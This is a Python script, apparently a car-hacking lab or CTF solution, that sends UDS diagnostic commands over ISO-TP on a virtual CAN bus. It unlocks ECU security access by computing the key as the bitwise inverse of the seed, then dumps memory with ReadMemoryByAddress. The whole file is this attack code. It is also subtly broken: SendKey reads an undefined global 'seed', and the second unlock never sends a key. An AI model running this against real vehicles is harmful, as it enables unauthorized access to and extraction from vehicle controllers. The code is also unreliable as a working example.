import can
import isotp
import time

tp = isotp.socket(3) # 3=timeout
tp.set_fc_opts(stmin=5, bs=10) # https://can-isotp.readthedocs.io/en/latest/isotp/socket.html
tp.bind('vcan0', isotp.Address(rxid=0x7e8, txid=0x7e0, addressing_mode=0))

LEVEL = 0x1 # 0x3
#SEED_LENGTH = 4

#### UDS utils ####
def openSession(session):
    print("Opening Session ", session)
    tp.send(bytearray([0x10, session]))
    tp.recv()

def TesterPresent():
    tp.send(bytearray([0x3E]))
    #tp.send(bytearray([0x3E, 0x80])) # Silent
    #tp.send(bytearray([0x3E, 0x00])) # Not Silent 
    return tp.recv()

def myECUReset():
    tp.send(bytearray([0x11, 0x01]))
    resp = tp.recv()
    return resp

#### SecAccess Unlocking

def getSeed():

    tp.send(bytearray([0x27, LEVEL]))
    seed = tp.recv()
    return seed[2:]

def keyCalculation(seed):
    seed = seed.hex()
    
    b1 = int(seed[0:2],16)
    b2 = int(seed[2:4],16)
    seed = int(seed, 16)

    # Bitwise Inverse (~) OK FOR LEVEL 3
    b1 = hex(~b1 & 0xFF)[2:]
    b2 = hex(~b2 & 0xFF)[2:]
    key = int(b1+b2, 16)
    key = key.to_bytes(2, 'big')

    return key

def SendKey():
    key = keyCalculation(seed)
    print(key.hex())
    tp.send(bytearray([0x27, LEVEL+1, key[0],key[1]]))
    print(tp.recv())

def VSEC_level3_unlock():
    seed = getSeed()
    SendKey()


def ReadMem():
    tp.send(bytearray([0x23, 0x24, 0x00, 0x01, 0xA8, 0x00, 0x08, 0x00]))
    resp = tp.recv()
    return resp

def VSEC_level1_unlock():
    tp.send(bytearray([0x27, 0x3]))
    seed = tp.recv()
    print(seed[2:])
    
    dump = ReadMem()
    print(dump)


def main():
    openSession(0x03)
    VSEC_level3_unlock()
    openSession(0x02)
    TesterPresent()
    VSEC_level1_unlock()
    TesterPresent()

if __name__ == '__main__':
    main()